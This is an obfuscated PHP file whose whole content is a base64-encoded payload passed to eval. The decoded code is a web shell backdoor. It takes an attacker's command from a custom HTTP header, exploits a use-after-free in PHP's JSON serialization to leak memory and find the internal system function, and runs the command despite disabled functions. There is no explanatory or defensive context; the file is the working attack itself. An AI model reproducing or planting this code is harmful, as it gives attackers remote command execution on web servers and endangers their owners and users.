<?php eval(base64_decode("CgoKJGNtZCA9IGJhc2U2NF9kZWNvZGUoJF9TRVJWRVJbJ0hUVFBfQUlaQVdBX05JTkpBJ10pOwoKCiRuX2FsbG9jID0gMTA7CgpjbGFzcyBNeVNwbEZpeGVkQXJyYXkgZXh0ZW5kcyBTcGxGaXhlZEFycmF5IHsKICAgIHB1YmxpYyBzdGF0aWMgJGxlYWs7Cn0KCmNsYXNzIFogaW1wbGVtZW50cyBKc29uU2VyaWFsaXphYmxlIHsKICAgIHB1YmxpYyBmdW5jdGlvbiB3cml0ZSgmJHN0ciwgJHAsICR2LCAkbiA9IDgpIHsKICAgICAgJGkgPSAwOwogICAgICBmb3IoJGkgPSAwOyAkaSA8ICRuOyAkaSsrKSB7CiAgICAgICAgJHN0clskcCArICRpXSA9IGNocigkdiAmIDB4ZmYpOwogICAgICAgICR2ID4+PSA4OwogICAgICB9CiAgICB9CgogICAgcHVibGljIGZ1bmN0aW9uIHN0cjJwdHIoJiRzdHIsICRwID0gMCwgJHMgPSA4KSB7CiAgICAgICAgJGFkZHJlc3MgPSAwOwogICAgICAgIGZvcigkaiA9ICRzLTE7ICRqID49IDA7ICRqLS0pIHsKICAgICAgICAgICAgJGFkZHJlc3MgPDw9IDg7CiAgICAgICAgICAgICRhZGRyZXNzIHw9IG9yZCgkc3RyWyRwKyRqXSk7CiAgICAgICAgfQogICAgICAgIHJldHVybiAkYWRkcmVzczsKICAgIH0KCiAgICBwdWJsaWMgZnVuY3Rpb24gcHRyMnN0cigkcHRyLCAkbSA9IDgpIHsKICAgICAgICAkb3V0ID0gIiI7CiAgICAgICAgZm9yICgkaT0wOyAkaSA8ICRtOyAkaSsrKSB7CiAgICAgICAgICAgICRvdXQgLj0gY2hyKCRwdHIgJiAweGZmKTsKICAgICAgICAgICAgJHB0ciA+Pj0gODsKICAgICAgICB9CiAgICAgICAgcmV0dXJuICRvdXQ7CiAgICB9CgogICAgcHVibGljIGZ1bmN0aW9uIGxlYWsxKCRhZGRyKSB7CiAgICAgICAgZ2xvYmFsICRzcGwxOwoKICAgICAgICAkdGhpcy0+d3JpdGUoJHRoaXMtPmFiYywgOCwgJGFkZHIgLSAweDEwKTsKICAgICAgICByZXR1cm4gc3RybGVuKGdldF9jbGFzcygkc3BsMSkpOwogICAgfQoKICAgIHB1YmxpYyBmdW5jdGlvbiBsZWFrMigkYWRkciwgJHAgPSAwLCAkcyA9IDgpIHsKICAgICAgICBnbG9iYWwgJHNwbDEsICRmYWtlX3RibF9vZmY7CgogICAgICAgICR0aGlzLT53cml0ZSgkdGhpcy0+YWJjLCAkZmFrZV90Ymxfb2ZmICsgMHgxMCwgMHhkZWFkYmVlZik7IAogICAgICAgICR0aGlzLT53cml0ZSgkdGhpcy0+YWJjLCAkZmFrZV90Ymxfb2ZmICsgMHgxOCwgJGFkZHIgKyAkcCAtIDB4MTApOyAKICAgICAgICAkdGhpcy0+d3JpdGUoJHRoaXMtPmFiYywgJGZha2VfdGJsX29mZiArIDB4MjAsIDYpOyAKCiAgICAgICAgJGxlYWsgPSBzdHJsZW4oJHNwbDE6OiRsZWFrKTsKICAgICAgICBpZigkcyAhPSA4KSB7ICRsZWFrICU9IDIgPDwgKCRzICogOCkgLSAxOyB9CgogICAgICAgIHJldHVybiAkbGVhazsKICAgIH0KCiAgICBwdWJsaWMgZnVuY3Rpb24gcGFyc2VfZWxmKCRiYXNlKSB7CiAgICAgICAgJGVfdHlwZSA9ICR0aGlzLT5sZWFrMigkYmFzZSwgMHgxMCwgMik7CgogICAgICAgICRlX3Bob2ZmID0gJHRoaXMtPmxlYWsyKCRiYXNlLCAweDIwKTsKICAgICAgICAkZV9waGVudHNpemUgPSAkdGhpcy0+bGVhazIoJGJhc2UsIDB4MzYsIDIpOwogICAgICAgICRlX3BobnVtID0gJHRoaXMtPmxlYWsyKCRiYXNlLCAweDM4LCAyKTsKCiAgICAgICAgZm9yKCRpID0gMDsgJGkgPCAkZV9waG51bTsgJGkrKykgewogICAgICAgICAgICAkaGVhZGVyID0gJGJhc2UgKyAkZV9waG9mZiArICRpICogJGVfcGhlbnRzaXplOwogICAgICAgICAgICAkcF90eXBlICA9ICR0aGlzLT5sZWFrMigkaGVhZGVyLCAwLCA0KTsKICAgICAgICAgICAgJHBfZmxhZ3MgPSAkdGhpcy0+bGVhazIoJGhlYWRlciwgNCwgNCk7CiAgICAgICAgICAgICRwX3ZhZGRyID0gJHRoaXMtPmxlYWsyKCRoZWFkZXIsIDB4MTApOwogICAgICAgICAgICAkcF9tZW1zeiA9ICR0aGlzLT5sZWFrMigkaGVhZGVyLCAweDI4KTsKCiAgICAgICAgICAgIGlmKCRwX3R5cGUgPT0gMSAmJiAkcF9mbGFncyA9PSA2KSB7IAogICAgICAgICAgICAgICAgJGRhdGFfYWRkciA9ICRlX3R5cGUgPT0gMiA/ICRwX3ZhZGRyIDogJGJhc2UgKyAkcF92YWRkcjsKICAgICAgICAgICAgICAgICRkYXRhX3NpemUgPSAkcF9tZW1zejsKICAgICAgICAgICAgfSBlbHNlIGlmKCRwX3R5cGUgPT0gMSAmJiAkcF9mbGFncyA9PSA1KSB7IAogICAgICAgICAgICAgICAgJHRleHRfc2l6ZSA9ICRwX21lbXN6OwogICAgICAgICAgICB9CiAgICAgICAgfQoKICAgICAgICBpZighJGRhdGFfYWRkciB8fCAhJHRleHRfc2l6ZSB8fCAhJGRhdGFfc2l6ZSkKICAgICAgICAgICAgcmV0dXJuIGZhbHNlOwoKICAgICAgICByZXR1cm4gWyRkYXRhX2FkZHIsICR0ZXh0X3NpemUsICRkYXRhX3NpemVdOwogICAgfQoKICAgIHB1YmxpYyBmdW5jdGlvbiBnZXRfYmFzaWNfZnVuY3MoJGJhc2UsICRlbGYpIHsKICAgICAgICBsaXN0KCRkYXRhX2FkZHIsICR0ZXh0X3NpemUsICRkYXRhX3NpemUpID0gJGVsZjsKICAgICAgICBmb3IoJGkgPSAwOyAkaSA8ICRkYXRhX3NpemUgLyA4OyAkaSsrKSB7CiAgICAgICAgICAgICRsZWFrID0gJHRoaXMtPmxlYWsyKCRkYXRhX2FkZHIsICRpICogOCk7CiAgICAgICAgICAgIGlmKCRsZWFrIC0gJGJhc2UgPiAwICYmICRsZWFrIC0gJGJhc2UgPCAkZGF0YV9hZGRyIC0gJGJhc2UpIHsKICAgICAgICAgICAgICAgICRkZXJlZiA9ICR0aGlzLT5sZWFrMigkbGVhayk7CiAgICAgICAgICAgICAgICBpZigkZGVyZWYgIT0gMHg3NDZlNjE3NDczNmU2ZjYzKQogICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlOwogICAgICAgICAgICB9IGVsc2UgY29udGludWU7CgogICAgICAgICAgICAkbGVhayA9ICR0aGlzLT5sZWFrMigkZGF0YV9hZGRyLCAoJGkgKyA0KSAqIDgpOwogICAgICAgICAgICBpZigkbGVhayAtICRiYXNlID4gMCAmJiAkbGVhayAtICRiYXNlIDwgJGRhdGFfYWRkciAtICRiYXNlKSB7CiAgICAgICAgICAgICAgICAkZGVyZWYgPSAkdGhpcy0+bGVhazIoJGxlYWspOwogICAgICAgICAgICAgICAgaWYoJGRlcmVmICE9IDB4Nzg2NTY4MzI2ZTY5NjIpCiAgICAgICAgICAgICAgICAgICAgY29udGludWU7CiAgICAgICAgICAgIH0gZWxzZSBjb250aW51ZTsKCiAgICAgICAgICAgIHJldHVybiAkZGF0YV9hZGRyICsgJGkgKiA4OwogICAgICAgIH0KICAgIH0KCiAgICBwdWJsaWMgZnVuY3Rpb24gZ2V0X2JpbmFyeV9iYXNlKCRiaW5hcnlfbGVhaykgewogICAgICAgICRiYXNlID0gMDsKICAgICAgICAkc3RhcnQgPSAkYmluYXJ5X2xlYWsgJiAweGZmZmZmZmZmZmZmZmYwMDA7CiAgICAgICAgZm9yKCRpID0gMDsgJGkgPCAweDEwMDA7ICRpKyspIHsKICAgICAgICAgICAgJGFkZHIgPSAkc3RhcnQgLSAweDEwMDAgKiAkaTsKICAgICAgICAgICAgJGxlYWsgPSAkdGhpcy0+bGVhazIoJGFkZHIsIDAsIDcpOwogICAgICAgICAgICBpZigkbGVhayA9PSAweDEwMTAyNDY0YzQ1N2YpIHsgCiAgICAgICAgICAgICAgICByZXR1cm4gJGFkZHI7CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICB9CgogICAgcHVibGljIGZ1bmN0aW9uIGdldF9zeXN0ZW0oJGJhc2ljX2Z1bmNzKSB7CiAgICAgICAgJGFkZHIgPSAkYmFzaWNfZnVuY3M7CiAgICAgICAgZG8gewogICAgICAgICAgICAkZl9lbnRyeSA9ICR0aGlzLT5sZWFrMigkYWRkcik7CiAgICAgICAgICAgICRmX25hbWUgPSAkdGhpcy0+bGVhazIoJGZfZW50cnksIDAsIDYpOwoKICAgICAgICAgICAgaWYoJGZfbmFtZSA9PSAweDZkNjU3NDczNzk3MykgeyAKICAgICAgICAgICAgICAgIHJldHVybiAkdGhpcy0+bGVhazIoJGFkZHIgKyA4KTsKICAgICAgICAgICAgfQogICAgICAgICAgICAkYWRkciArPSAweDIwOwogICAgICAgIH0gd2hpbGUoJGZfZW50cnkgIT0gMCk7CiAgICAgICAgcmV0dXJuIGZhbHNlOwogICAgfQoKICAgIHB1YmxpYyBmdW5jdGlvbiBqc29uU2VyaWFsaXplKCkgewogICAgICAgIGdsb2JhbCAkeSwgJGNtZCwgJHNwbDEsICRmYWtlX3RibF9vZmYsICRuX2FsbG9jOwoKICAgICAgICAkY29udGlndW91cyA9IFtdOwogICAgICAgIGZvcigkaSA9IDA7ICRpIDwgJG5fYWxsb2M7ICRpKyspCiAgICAgICAgICAgICRjb250aWd1b3VzW10gPSBuZXcgRGF0ZUludGVydmFsKCdQVDFTJyk7CgogICAgICAgICRyb29tID0gW107CiAgICAgICAgZm9yKCRpID0gMDsgJGkgPCAkbl9hbGxvYzsgJGkrKykKICAgICAgICAgICAgJHJvb21bXSA9IG5ldyBaKCk7CgogICAgICAgICRfcHJvdGVjdG9yID0gJHRoaXMtPnB0cjJzdHIoMCwgNzgpOwoKICAgICAgICAkdGhpcy0+YWJjID0gJHRoaXMtPnB0cjJzdHIoMCwgNzkpOwogICAgICAgICRwID0gbmV3IERhdGVJbnRlcnZhbCgnUFQxUycpOwoKICAgICAgICB1bnNldCgkeVswXSk7CiAgICAgICAgdW5zZXQoJHApOwoKICAgICAgICAkcHJvdGVjdG9yID0gIi4kX3Byb3RlY3RvciI7CgogICAgICAgICR4ID0gbmV3IERhdGVJbnRlcnZhbCgnUFQxUycpOwogICAgICAgICR4LT5kID0gMHgyMDAwOwogICAgICAgICR4LT5oID0gMHhkZWFkYmVlZjsKCiAgICAgICAgaWYoJHRoaXMtPnN0cjJwdHIoJHRoaXMtPmFiYykgIT0gMHhkZWFkYmVlZikgewogICAgICAgICAgICBkaWUoJ1VBRiBmYWlsZWQuJyk7CiAgICAgICAgfQoKICAgICAgICAkc3BsMSA9IG5ldyBNeVNwbEZpeGVkQXJyYXkoKTsKICAgICAgICAkc3BsMiA9IG5ldyBNeVNwbEZpeGVkQXJyYXkoKTsKCiAgICAgICAgJGNsYXNzX2VudHJ5ID0gJHRoaXMtPnN0cjJwdHIoJHRoaXMtPmFiYywgMHgxMjApOwogICAgICAgICRoYW5kbGVycyA9ICR0aGlzLT5zdHIycHRyKCR0aGlzLT5hYmMsIDB4MTI4KTsKICAgICAgICAkcGhwX2hlYXAgPSAkdGhpcy0+c3RyMnB0cigkdGhpcy0+YWJjLCAweDFhOCk7CiAgICAgICAgJGFiY19hZGRyID0gJHBocF9oZWFwIC0gMHgyMTg7CgogICAgICAgICRmYWtlX29iaiA9ICRhYmNfYWRkcjsKICAgICAgICAkdGhpcy0+d3JpdGUoJHRoaXMtPmFiYywgMCwgMik7IAogICAgICAgICR0aGlzLT53cml0ZSgkdGhpcy0+YWJjLCAweDEyMCwgJGFiY19hZGRyKTsgCgogICAgICAgIGZvcigkaSA9IDA7ICRpIDwgMTY7ICRpKyspIHsKICAgICAgICAgICAgJHRoaXMtPndyaXRlKCR0aGlzLT5hYmMsIDB4MTAgKyAkaSAqIDgsIAogICAgICAgICAgICAgICAgJHRoaXMtPmxlYWsxKCRjbGFzc19lbnRyeSArIDB4MTAgKyAkaSAqIDgpKTsKICAgICAgICB9CgogICAgICAgICRmYWtlX3RibF9vZmYgPSAweDcwICogNCAtIDE2OwogICAgICAgICR0aGlzLT53cml0ZSgkdGhpcy0+YWJjLCAweDMwLCAkYWJjX2FkZHIgKyAkZmFrZV90Ymxfb2ZmKTsKICAgICAgICAkdGhpcy0+d3JpdGUoJHRoaXMtPmFiYywgMHgzOCwgJGFiY19hZGRyICsgJGZha2VfdGJsX29mZik7CgogICAgICAgICR0aGlzLT53cml0ZSgkdGhpcy0+YWJjLCAkZmFrZV90Ymxfb2ZmLCAkYWJjX2FkZHIgKyAkZmFrZV90Ymxfb2ZmICsgMHgxMCk7IAogICAgICAgICR0aGlzLT53cml0ZSgkdGhpcy0+YWJjLCAkZmFrZV90Ymxfb2ZmICsgOCwgMTApOyAKCiAgICAgICAgJGJpbmFyeV9sZWFrID0gJHRoaXMtPmxlYWsyKCRoYW5kbGVycyArIDB4MTApOwogICAgICAgIGlmKCEoJGJhc2UgPSAkdGhpcy0+Z2V0X2JpbmFyeV9iYXNlKCRiaW5hcnlfbGVhaykpKSB7CiAgICAgICAgICAgIGRpZSgiQ291bGRuJ3QgZGV0ZXJtaW5lIGJpbmFyeSBiYXNlIGFkZHJlc3MiKTsKICAgICAgICB9CgogICAgICAgIGlmKCEoJGVsZiA9ICR0aGlzLT5wYXJzZV9lbGYoJGJhc2UpKSkgewogICAgICAgICAgICBkaWUoIkNvdWxkbid0IHBhcnNlIEVMRiIpOwogICAgICAgIH0KCiAgICAgICAgaWYoISgkYmFzaWNfZnVuY3MgPSAkdGhpcy0+Z2V0X2Jhc2ljX2Z1bmNzKCRiYXNlLCAkZWxmKSkpIHsKICAgICAgICAgICAgZGllKCJDb3VsZG4ndCBnZXQgYmFzaWNfZnVuY3Rpb25zIGFkZHJlc3MiKTsKICAgICAgICB9CgogICAgICAgIGlmKCEoJHppZl9zeXN0ZW0gPSAkdGhpcy0+Z2V0X3N5c3RlbSgkYmFzaWNfZnVuY3MpKSkgewogICAgICAgICAgICBkaWUoIkNvdWxkbid0IGdldCB6aWZfc3lzdGVtIGFkZHJlc3MiKTsKICAgICAgICB9CiAgICAgICAgCiAgICAgICAgJGZha2VfYmt0X29mZiA9IDB4NzAgKiA1IC0gMTY7CgogICAgICAgICRmdW5jdGlvbl9kYXRhID0gJHRoaXMtPnN0cjJwdHIoJHRoaXMtPmFiYywgMHg1MCk7CiAgICAgICAgZm9yKCRpID0gMDsgJGkgPCA0OyAkaSsrKSB7CiAgICAgICAgICAgICR0aGlzLT53cml0ZSgkdGhpcy0+YWJjLCAkZmFrZV9ia3Rfb2ZmICsgJGkgKiA4LCAKICAgICAgICAgICAgICAgICR0aGlzLT5sZWFrMigkZnVuY3Rpb25fZGF0YSArIDB4NDAgKiA0LCAkaSAqIDgpKTsKICAgICAgICB9CgogICAgICAgICRmYWtlX2JrdF9hZGRyID0gJGFiY19hZGRyICsgJGZha2VfYmt0X29mZjsKICAgICAgICAkdGhpcy0+d3JpdGUoJHRoaXMtPmFiYywgMHg1MCwgJGZha2VfYmt0X2FkZHIpOwogICAgICAgIGZvcigkaSA9IDA7ICRpIDwgMzsgJGkrKykgewogICAgICAgICAgICAkdGhpcy0+d3JpdGUoJHRoaXMtPmFiYywgMHg1OCArICRpICogNCwgMSwgNCk7CiAgICAgICAgfQoKICAgICAgICAkZnVuY3Rpb25fenZhbCA9ICR0aGlzLT5zdHIycHRyKCR0aGlzLT5hYmMsICRmYWtlX2JrdF9vZmYpOwogICAgICAgIGZvcigkaSA9IDA7ICRpIDwgMTI7ICRpKyspIHsKICAgICAgICAgICAgJHRoaXMtPndyaXRlKCR0aGlzLT5hYmMsICAkZmFrZV9ia3Rfb2ZmICsgMHg3MCArICRpICogOCwgCiAgICAgICAgICAgICAgICAkdGhpcy0+bGVhazIoJGZ1bmN0aW9uX3p2YWwsICRpICogOCkpOwogICAgICAgIH0KCiAgICAgICAgJHRoaXMtPndyaXRlKCR0aGlzLT5hYmMsICRmYWtlX2JrdF9vZmYgKyAweDcwICsgMHgzMCwgJHppZl9zeXN0ZW0pOwogICAgICAgICR0aGlzLT53cml0ZSgkdGhpcy0+YWJjLCAkZmFrZV9ia3Rfb2ZmLCAkZmFrZV9ia3RfYWRkciArIDB4NzApOwoKICAgICAgICAkc3BsMS0+b2Zmc2V0R2V0KCRjbWQpOwoKICAgICAgICBleGl0KCk7CiAgICB9Cn0KCiR5ID0gW25ldyBaKCldOwpqc29uX2VuY29kZShbJiR5XSk7"));?>